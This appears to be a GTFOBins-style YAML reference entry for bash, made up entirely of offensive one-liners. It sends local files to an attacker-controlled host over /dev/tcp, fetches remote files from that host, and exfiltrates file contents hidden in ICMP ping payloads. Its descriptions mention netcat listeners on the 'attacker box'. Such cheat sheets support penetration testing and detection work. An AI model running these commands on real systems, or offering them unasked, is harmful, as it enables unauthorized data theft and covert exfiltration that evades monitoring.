---
functions:
  file-upload:
    - description: Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
      code: |
        bash -c 'echo -e "POST / HTTP/0.9\n\n$(<$LFILE)" > /dev/tcp/$RHOST/$RPORT'
    - description: Send local file using a TCP connection. Run `nc -l -p 4444 > "file_to_save"` on the attacker box to collect the file.
      code: |
        bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
  file-download:
    - description: Fetch a remote file via HTTP GET request.
      code: |
        bash -c '{ echo -ne "GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n" 1>&3; cat 0<&3; } \
            3<>/dev/tcp/$RHOST/$RPORT \
            | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > $LFILE'
    - description: Fetch remote file using a TCP connection. Run `nc -l -p 4444 < "file_to_send"` on the attacker box to send the file.
      code: |
        bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
  data-exfiltration:
    - description: Exfiltrate file contents or command output over ICMP packets embedded in ping requests.
      code: |
        hex=$(while IFS= read -r line; do for ((i=0; i<${#line}; i++));
        do printf "%02x" "'${line:$i:1}"; done; done < $LFILE); i=0;
        while [ $i -lt ${#hex} ]; do chunk="${hex:$i:16}"; ping -c1 -p "$chunk" $RHOST; i=$((i+16)); done
---
